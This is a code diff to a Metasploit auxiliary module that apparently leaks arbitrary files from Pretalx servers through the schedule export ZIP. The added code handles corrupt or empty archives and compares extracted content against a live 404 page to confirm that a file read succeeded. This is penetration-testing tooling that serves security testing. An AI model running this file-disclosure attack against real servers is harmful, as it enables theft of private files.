@@ -102,11 +102,29 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status('Trying to extract target file')
 
     zip_data = download_zip
+    fail_with(Failure::UnexpectedReply, 'The schedule export returned no ZIP data') if zip_data.blank?
 
-    zip = Zip::File.open_buffer(zip_data)
-    target_entry = zip.find_entry("#{datastore['CONFERENCE_NAME']}#{datastore['MEDIA_URL']}#{datastore['FILEPATH']}")
-    fail_with Failure::PayloadFailed, 'Failed to extract target file, check if export worked' unless target_entry
-    extracted_content = zip.read(zip.find_entry(target_entry))
+    begin
+      zip = Zip::File.open_buffer(zip_data)
+      target_entry = zip.find_entry("#{datastore['CONFERENCE_NAME']}#{datastore['MEDIA_URL']}#{datastore['FILEPATH']}")
+      fail_with Failure::PayloadFailed, 'Failed to extract target file, check if export worked' unless target_entry
+      extracted_content = zip.read(zip.find_entry(target_entry))
+    rescue Zip::Error => e
+      elog('Failed to read the Pretalx schedule export ZIP', error: e)
+      fail_with(Failure::UnexpectedReply, 'The schedule export is not a readable ZIP archive')
+    end
+    fail_with(Failure::NotFound, 'The exported file is empty; no file content was recovered') if extracted_content.empty?
+
+    # The exporter falls back to a view response when a local file is missing,
+    # discarding its HTTP status before writing its body to the archive.
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => "#{datastore['MEDIA_URL']}//#{datastore['FILEPATH']}",
+      'headers' => { 'Accept' => 'text/html' }
+    })
+    if exported_not_found?(extracted_content, res)
+      fail_with(Failure::NotFound, 'The exported file matches the server HTTP 404 response; the file read was not confirmed')
+    end
 
     vprint_status('Extraction successful')
 
@@ -127,6 +145,24 @@ class MetasploitModule < Msf::Auxiliary
       refs: references,
       info: "Module #{fullname} successfully leaked file"
     })
+  end
+
+  def exported_not_found?(content, res)
+    return false unless res&.code == 404
+    return true if res.body == content
+    return false if res.body.blank?
+
+    documents = [Nokogiri::HTML(content), res.get_html_document]
+    normalized = documents.map do |document|
+      # common/error.html places phrases.base.not_found in this heading;
+      # Pretalx chooses a new phrase for each request. Compare everything else.
+      headings = document.css('body > div#wrapper > h2')
+      return false unless headings.length == 1
+
+      headings.first.content = ''
+      document.to_html
+    end
+    normalized.first == normalized.last
   end
 
 end
